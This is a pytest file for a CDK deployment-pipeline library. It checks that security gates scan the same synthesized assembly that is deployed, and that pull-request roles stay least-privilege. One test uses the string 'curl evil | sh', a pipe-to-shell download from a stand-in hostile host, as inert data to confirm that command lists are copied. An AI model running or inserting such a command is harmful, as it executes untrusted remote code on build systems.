"""Build once: the assembly the gates inspect is the assembly that is deployed."""

import copy
import json

import pytest
from aws_cdk import aws_iam as iam
from aws_cdk.assertions import Template
from test_pipeline import GATES, build

from specter_pipeline import Assembly, DeployStep, Gate, PostDeployStep, Runtime
from specter_pipeline import testing as c
from specter_pipeline.gate import cdk_deploy_apps
from specter_pipeline.presets import python_cdk_assembly, python_cdk_gates

REPO = "Specter099/demo"
SCAN = Gate("scan", ["ls cdk.out"], uses_assembly=True)
ASM_GATES = [*GATES, SCAN]
DEPLOY = DeployStep("app", ["cdk deploy --app cdk.out AppStack --require-approval never"])


def asm_build(**overrides) -> Template:
    kw = {
        "application_stage": None,
        "assembly": Assembly(install=["pip install -r requirements.txt"]),
        "deploy_step": DEPLOY,
        "gates": ASM_GATES,
    }
    kw.update(overrides)
    return build(**kw)


@pytest.fixture(scope="module")
def tpl() -> Template:
    return asm_build()


def actions(t: Template, stage: str) -> dict:
    return {a["Name"]: a for a in c._stage(t, stage)["Actions"]}


def inputs(action: dict) -> set[str]:
    return {i["Name"] for i in action.get("InputArtifacts", [])}


# --- cdk deploy parsing ------------------------------------------------------------------------


@pytest.mark.parametrize(
    "command,apps",
    [
        ("cdk deploy AppStack --require-approval never", [None]),
        ("cdk deploy --app cdk.out AppStack", ["cdk.out"]),
        ("cdk -a cdk.out deploy AppStack", ["cdk.out"]),
        ("npx cdk deploy --app=cdk.out X && echo done", ["cdk.out"]),
        ("cdk synth && cdk deploy X", [None]),
        ("cdk synth && echo deploy", []),
        ("./scripts/deploy.sh", []),
        ('echo "unbalanced cdk deploy', [None]),  # fails closed
    ],
)
def test_cdk_deploy_apps(command, apps):
    assert cdk_deploy_apps(command) == apps


# --- step validation ---------------------------------------------------------------------------


def test_assembly_defaults():
    a = Assembly()
    assert (a.name, a.commands, a.runtime, a.output_dir, a.memory_gb) == (
        "Assemble",
        ["cdk synth"],
        Runtime.PYTHON_NODE,
        "cdk.out",
        4,
    )


def test_assembly_refuses_iam_permissions():
    stmt = iam.PolicyStatement(actions=["ssm:GetParameter"], resources=["arn:aws:ssm:::x"])
    with pytest.raises(ValueError, match="no IAM permissions"):
        Assembly(policy_statements=[stmt])


def test_assembly_needs_python_and_node():
    with pytest.raises(ValueError, match="PYTHON_NODE"):
        Assembly(runtime=Runtime.PYTHON)


@pytest.mark.parametrize("bad", ["/abs", "../up", "a/../b", "", "with space"])
def test_assembly_output_dir_must_be_relative(bad):
    with pytest.raises(ValueError, match="relative path"):
        Assembly(output_dir=bad)


@pytest.mark.parametrize("cls", [Gate, DeployStep, PostDeployStep, Assembly])
def test_every_step_copies_its_lists(cls):
    commands, install = ["one"], ["pip install x"]
    step = cls(name="s", commands=commands, install=install)
    commands.append("two")
    install.append("curl evil | sh")
    assert step.commands == ["one"] and step.install == ["pip install x"]


@pytest.mark.parametrize("cls", [Gate, DeployStep, PostDeployStep])
def test_a_bare_string_is_not_a_command_list(cls):
    with pytest.raises(TypeError, match="lists of strings"):
        cls("s", "cdk deploy")


# --- pipeline validation -----------------------------------------------------------------------


def test_assembly_is_refused_with_an_application_stage():
    with pytest.raises(ValueError, match="already builds the assembly"):
        build(assembly=Assembly())


def test_a_gate_cannot_read_an_assembly_the_pipeline_does_not_build():
    with pytest.raises(ValueError, match="no assembly"):
        asm_build(assembly=None)


@pytest.mark.parametrize(
    "command",
    [
        "cdk deploy AppStack --require-approval never",
        "cdk deploy --app 'python3 app.py' AppStack",
        "cdk synth && cdk deploy --app cdk.out A && cdk deploy B",
    ],
)
def test_deploy_must_read_the_assembly(command):
    with pytest.raises(ValueError, match="without `--app cdk.out`"):
        asm_build(deploy_step=DeployStep("app", [command]))


def test_a_deploy_script_is_not_second_guessed():
    asm_build(deploy_step=DeployStep("app", ["./scripts/deploy.sh"]))


def test_a_custom_output_dir_is_honoured_end_to_end():
    t = asm_build(
        assembly=Assembly(output_dir="build/cdk.out"),
        deploy_step=DeployStep("app", ["cdk deploy -a build/cdk.out AppStack"]),
    )
    assert "build/cdk.out" in c.step_mounts(t, "Deploy-app").values()
    c.assert_builds_once(t, ASM_GATES)


# --- what it synthesizes -----------------------------------------------------------------------


def test_stage_order_is_unchanged(tpl):
    c.assert_stage_order(tpl)


def test_assembly_runs_first_and_only_assembly_gates_wait_for_it(tpl):
    gates = actions(tpl, "Gates")
    first = gates["Assemble"]["RunOrder"]
    for g in GATES:
        assert gates[f"Gate-{g.name}"]["RunOrder"] == first, g.name
    assert gates["Gate-scan"]["RunOrder"] > first


def test_scan_gate_and_deploy_read_the_same_artifact(tpl):
    (out,) = actions(tpl, "Gates")["Assemble"]["OutputArtifacts"]
    assert out["Name"] in inputs(actions(tpl, "Gates")["Gate-scan"])
    assert out["Name"] in inputs(actions(tpl, "Deploy")["Deploy-app"])
    for g in GATES:
        assert out["Name"] not in inputs(actions(tpl, "Gates")[f"Gate-{g.name}"])
    assert c.step_mounts(tpl, "Deploy-app") == {out["Name"]: "cdk.out"}
    assert c.step_mounts(tpl, "Gate-scan") == {out["Name"]: "cdk.out"}


def test_assembly_step_installs_the_pinned_cli_then_synthesizes(tpl):
    cmds = c.step_commands(tpl, "Assemble")
    cli = next(i for i, x in enumerate(cmds) if x.startswith("npm install -g") and "aws-cdk@" in x)
    assert cmds.index("pip install -r requirements.txt") > cli
    assert cmds[-1] == "cdk synth"


def test_every_project_is_still_lambda_compute(tpl):
    c.assert_lambda_compute(tpl)
    c.assert_ci_env_on_repo_command_projects(tpl)


def test_approval_still_strictly_precedes_the_deploy(tpl):
    c.assert_deploy_ordering(tpl)
    c.assert_deploy_closed(tpl)


def test_contract_passes_and_includes_build_once(tpl):
    c.assert_standard_contract(tpl, repo=REPO, gates=ASM_GATES, node_gates=["synth-check", "lint"])


def test_stage_mode_gates_read_the_synth_output_that_is_deployed():
    t = build(gates=ASM_GATES)
    gates = actions(t, "Gates")
    assert "Assemble" not in gates
    assert "Synth_Output" in inputs(gates["Gate-scan"])
    c.assert_standard_contract(
        t, repo=REPO, gates=ASM_GATES, deploy_stage="Prod", node_gates=["synth-check", "lint"]
    )


# --- pull requests -----------------------------------------------------------------------------


def _pr(t: Template, gate: str) -> dict:
    (res,) = [
        r for r in c.pr_projects(t, "demo").values() if r["Properties"]["Name"] == f"demo-pr-{gate}"
    ]
    return res["Properties"]


def test_pr_check_for_an_assembly_gate_builds_the_assembly_first(tpl):
    props = _pr(tpl, "scan")
    cmds = json.loads(props["Source"]["BuildSpec"])["phases"]["build"]["commands"]
    assert any("node.tgz" in x for x in cmds), "needs Node to synthesize"
    assert cmds.index("cdk synth") < cmds.index("ls cdk.out")
    assert "python3.12" in props["Environment"]["Image"]


def test_pr_check_for_an_ordinary_gate_is_unchanged(tpl):
    cmds = json.loads(_pr(tpl, "lint")["Source"]["BuildSpec"])["phases"]["build"]["commands"]
    assert cmds == ["npm run lint"]


def test_pr_roles_stay_least_privilege(tpl):
    c.assert_pr_checks(tpl, ASM_GATES, "demo")
    c.assert_pr_roles_least_privilege(tpl, "demo")


def test_stage_mode_pr_check_reuses_the_synth_recipe():
    t = build(gates=ASM_GATES)
    cmds = json.loads(_pr(t, "scan")["Source"]["BuildSpec"])["phases"]["build"]["commands"]
    assert cmds.index("cdk -a 'python3 pipeline_app.py' synth") < cmds.index("ls cdk.out")


# --- presets -----------------------------------------------------------------------------------


def test_preset_assembly_mode_drops_cdk_synth_and_scans_the_shared_templates():
    gates = {g.name: g for g in python_cdk_gates(assembly=True)}
    assert "cdk-synth" not in gates
    aa = gates["access-analyzer"]
    assert aa.uses_assembly and aa.runtime is Runtime.PYTHON
    assert not any("cdk synth" in x for x in aa.commands)
    assert not any("requirements.txt" in x or "aws-cdk@" in x for x in aa.install)
    assert any("--template-dir cdk.out " in x for x in aa.commands)
    assert any("sha256sum -c" in x for x in aa.commands), "script must still be verified"
    assert not aa.runs_on_pull_requests


def test_preset_default_is_unchanged():
    gates = {g.name: g for g in python_cdk_gates()}
    assert "cdk-synth" in gates and not gates["access-analyzer"].uses_assembly
    assert gates["access-analyzer"].commands[0] == "cdk synth --quiet"


def test_preset_template_dir_is_quoted():
    (aa,) = [g for g in python_cdk_gates(assembly=True, assembly_dir="cdk.out/assembly-Prod")
             if g.name == "access-analyzer"]
    assert any("--template-dir cdk.out/assembly-Prod " in x for x in aa.commands)


def test_preset_pipeline_in_assembly_mode_satisfies_the_contract():
    gates = python_cdk_gates(assembly=True, env={"X": "1"})
    t = asm_build(assembly=python_cdk_assembly(env={"X": "1"}), gates=gates)
    c.assert_standard_contract(t, repo=REPO, gates=gates, node_gates=["tests"])
    allowed = c.CDK_INTERNAL_WILDCARDS | {"access-analyzer:CheckNoPublicAccess"}
    c.assert_no_wildcard_resources(t, allowed_actions=allowed)


# --- the helper rejects each way of not building once ------------------------------------------


def mutated(change) -> Template:
    doc = copy.deepcopy(asm_build().to_json())
    change(doc["Resources"])
    return Template.from_json(doc)


def _stage_of(res, name):
    pipe = next(r for r in res.values() if r["Type"] == "AWS::CodePipeline::Pipeline")
    return next(s for s in pipe["Properties"]["Stages"] if s["Name"] == name)


def _action(res, stage, name):
    return next(a for a in _stage_of(res, stage)["Actions"] if a["Name"] == name)


def _project(res, step):
    return next(
        r["Properties"]
        for r in res.values()
        if r["Type"] == "AWS::CodeBuild::Project"
        and str(r["Properties"].get("Description", "")).endswith(f"/{step}")
    )


def _drop_assembly_input(action):
    action["InputArtifacts"] = action["InputArtifacts"][:1]


def _deploy_without_app(res):
    props = _project(res, "Deploy-app")
    spec = json.loads(props["Source"]["BuildSpec"])
    spec["phases"]["build"]["commands"][-1] = "cdk deploy AppStack --require-approval never"
    props["Source"]["BuildSpec"] = json.dumps(spec)


def _deploy_without_mount(res):
    props = _project(res, "Deploy-app")
    spec = json.loads(props["Source"]["BuildSpec"])
    del spec["phases"]["install"]
    props["Source"]["BuildSpec"] = json.dumps(spec)


def _remove_assembly_step(res):
    st = _stage_of(res, "Gates")
    st["Actions"] = [a for a in st["Actions"] if a["Name"] != "Assemble"]


def _scan_in_parallel_with_assembly(res):
    _action(res, "Gates", "Gate-scan")["RunOrder"] = _action(res, "Gates", "Assemble")["RunOrder"]


@pytest.mark.parametrize(
    "change,message",
    [
        (lambda r: _drop_assembly_input(_action(r, "Deploy", "Deploy-app")), "does not read the assembly"),
        (_deploy_without_app, "not the assembly"),
        (_deploy_without_mount, "does not link"),
        (lambda r: _drop_assembly_input(_action(r, "Gates", "Gate-scan")), "does not read the deployed"),
        (_scan_in_parallel_with_assembly, "does not wait for the assembly"),
        (_remove_assembly_step, "no assembly step"),
    ],
)
def test_assert_builds_once_rejects(change, message):
    with pytest.raises(AssertionError, match=message):
        c.assert_builds_once(mutated(change), ASM_GATES)


def test_assert_gates_present_rejects_an_unexpected_second_producer():
    def add(res):
        st = _stage_of(res, "Gates")
        extra = copy.deepcopy(_action(res, "Gates", "Assemble"))
        extra["Name"] = "Assemble2"
        st["Actions"].append(extra)

    with pytest.raises(AssertionError, match="more than one"):
        c.assert_gates_present(mutated(add), ASM_GATES)


def test_assert_gates_present_still_requires_parallel_gates():
    def stagger(res):
        _action(res, "Gates", "Gate-lint")["RunOrder"] = 5

    with pytest.raises(AssertionError, match="parallel"):
        c.assert_gates_present(mutated(stagger), ASM_GATES)
